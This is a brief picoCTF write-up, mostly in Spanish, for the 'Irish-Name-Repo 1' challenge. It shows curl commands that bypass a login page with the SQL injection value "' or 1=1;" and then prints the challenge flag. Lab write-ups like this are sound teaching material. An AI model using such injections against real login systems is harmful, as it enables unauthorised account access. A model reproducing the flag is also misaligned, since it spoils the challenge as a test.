# Irish-Name-Repo 1
## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Datos de Acceso al Nivel
```
```
## Solucion
```Bash
abrir link
intentar logearse como admin
inspeccionar pagina login
buscar los elementos del login

curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=admin or 1=1;&debug=1"

modificar password con la inyeccion 1=1
curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=' or 1=1;&debug=1"

copiar flag
picoCTF{s0m3_SQL_f8adf3fb}
```
## Notas Adicionales
|**Comandos**|**Descripcion**|
|--------|-------------|
|||
|||
## Referencias
* https://www.w3schools.com/sql/sql_injection.asp
